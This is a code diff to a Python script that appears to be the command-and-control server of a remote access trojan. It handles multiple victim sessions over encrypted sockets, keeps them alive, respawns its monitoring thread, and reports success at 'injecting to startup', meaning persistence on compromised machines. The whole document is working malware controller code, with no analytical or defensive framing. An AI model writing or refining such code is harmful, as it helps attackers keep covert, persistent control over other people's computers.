@@ -236,17 +236,22 @@ def main():
                     else:
                         s.send(encrypt(PASSKEY, " ".join(thing2)))
                     while statusdone == False:
-                        settime
+                        s.settimeout(500)
                         time.sleep(0.1)
-                        status = s.recv(BUFFER_SIZE)
+                        status = decrypt(PASSKEY, s.recv(1024)).decode()
                         if status == "error":
                             print("There was an error!")
-                            error = s.recv(BUFFER_SIZE)
+                            error = decrypt(PASSKEY, s.recv(1024)).decode()
                             print(bcolors.WARNING + error + bcolors.ENDC)
                         elif status == "doneerror":
                             print(bcolors.WARNING + "stopped with error" + bcolors.ENDC)
+                            statusdone = True
+                        elif status == "update":
+                            print(bcolors.OKGREEN + "Status update: " + decrypt(PASSKEY, s.recv(1024)).decode() + bcolors.ENDC)
+                            statusdone = True
                         elif status == "done":
                             print(bcolors.OKGREEN + "Succesfully injected to startup" + bcolors.ENDC)
+                            statusdone = True
                     uploading = False
         except Exception as e:
             print("whoops something went wrong.. reconnecting..")
@@ -258,21 +263,28 @@ def keepalive():
         time.sleep(10)
         for i, x in enumerate(sessions):
             try:
+                time.sleep(10)
                 alive = False
                 x.send(encrypt(PASSKEY, "keepalive"))
                 while alive == False and uploading == False:
                     try:
-                        x.settimeout(15)
+                        x.settimeout(25)
                         it = decrypt(PASSKEY, x.recv(1024)).decode()
-                        if decrypt(it) == "still alive":
-                            alive = True
-                    except Exception:
+                        alive = True
+                    except Exception as e:
                         print("Session number: " + str(i) + ". On address: " + str(addresses.pop(i)) + "Has lost connection or something wtf")
                         del sessions[i]
+                        print(str(e))
+                        t3 = Thread(target = keepalive)
+                        t3.setDaemon(True)
+                        t3.start()
             
             except Exception:
                 print("Session number: " + str(i) + ". On address: " + str(addresses.pop(i)) + "Has lost connection or something wtf")
                 del sessions[i]
+                t3 = Thread(target = keepalive)
+                t3.setDaemon(True)
+                t3.start()
 
 
 t1 = Thread(target = main)
@@ -285,6 +297,7 @@ t1.start()
 t2.start()
 t3.start()
 while True:
+    time.sleep(0.01)
     pass
 
 
